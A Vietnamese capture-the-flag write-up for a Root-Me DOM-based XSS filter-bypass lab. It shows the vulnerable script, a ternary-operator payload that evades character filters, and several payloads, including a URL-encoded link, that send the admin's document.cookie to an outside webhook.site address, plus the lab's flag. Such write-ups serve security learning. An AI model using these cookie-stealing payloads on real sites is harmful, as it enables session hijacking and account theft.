# XSS DOM Based - Filters Bypass

**LAB**: <http://challenge01.root-me.org/web-client/ch33/>

![image](https://github.com/user-attachments/assets/b1c98154-075e-4dda-970b-6a3c7b404f5a)

Như tiêu đề thì đây là dạng bài XSS DOM-Based. Việc chúng ta cần làm là lấy admin cookie thông qua thuật toán tìm kiếm của website. Bên cạnh đó ta có phần contact yêu cầu nhập một đường link bắt đầu bằng link của trang Web - khả năng cao cần phải lấy payload url gửi ở đây.
```
<script>
        var random = Math.random() * (99);
        var number = '';
        if(random == number) {
            document.getElementById('state').style.color = 'green';
            document.getElementById('state').innerHTML = 'You won this game but you don\'t have the flag ;)';
        }
        else{
            document.getElementById('state').style.color = 'red';
            document.getElementById('state').innerText = 'Sorry, wrong answer ! The right answer was ' + random;
        }
</script>
```
Nhìn vào thuật toán, ta có ý tưởng khai thác nhằm vào mục number. Ta sẽ thử XSS bằng một lệnh đơn giản như `<script>print()</script>`. Kết quả, script đã bị filter mất hết dấu < và >.

![image](https://github.com/user-attachments/assets/f6833d67-9e4b-4313-85ef-fa97d5aeb6d9)

Với những bài bypass, ta thử tất cả các ký tự đặc biệt `()-=[]{}\|:;'"<>?/+%` để xem có thể dùng những kí tự nào để viết script. Sau khi test, ta biết web đã filter hết các kí tự hay dùng để khai thác ;, +, %. Sau một hồi thử mọi thứ, ta cần dùng tới chat GPT và nó gợi ý một cách khá hay là dùng toán tử ba ngôi. Thử payload `1'?print():'1` rất may nó đã hoạt động 🥲. Ta dùng webhook để lấy admin cookie.  
`1'?window.location.href="https://webhook.site/e0ab9c4f-1caf-47fb-bfc4-1f08b1f706b6?cookie=".concat('',document.cookie):'1`.

![image](https://github.com/user-attachments/assets/c5f69643-a63d-4fa9-bcb0-2aa34efca160)  

Rất cú XD!!  

Ta thử bỏ `https://` nhưng chưa được.

![image](https://github.com/user-attachments/assets/a4755d03-9184-4126-88b5-785636333bef)

Trang web vẫn chưa nhận đường link redirect. Thử thêm () nhưng vẫn chưa được. Hình như do dấu `/` nên đã cắt payload ra làm 2 phần. Ta giữ lại `//` thay vì bỏ cả cụm `https://`.  
Paydload `1'?(window.location.href='//webhook.site/e0ab9c4f-1caf-47fb-bfc4-1f08b1f706b6?cookie='.concat('',document.cookie)):'1` và redirect thành công. 
Nhưng lạ là admin cookie không hề được trả về dù redirect đã thành công. Ta thử lấy payload url bằng **BurpSuite** rồi nhập vào phần contact.
**Payload url** = `http://challenge01.root-me.org/web-client/ch33/?number=1%27%3F%28window.location.href%3D%28%27%2F%2Fwebhook.site%2Fe0ab9c4f-1caf-47fb-bfc4-1f08b1f706b6%3Fcookie%3D%27%29.concat%28%27%27%2C+document.cookie%29%29%3A%271`  
![image](https://github.com/user-attachments/assets/97f3987c-f8f2-4a5a-843c-aabfdf7eaba8)  
Đợi một lát thì flag sẽ trả về.

**Flag**=rootme{FilTERS_ByPass_DOm_BASEd_XSS}.




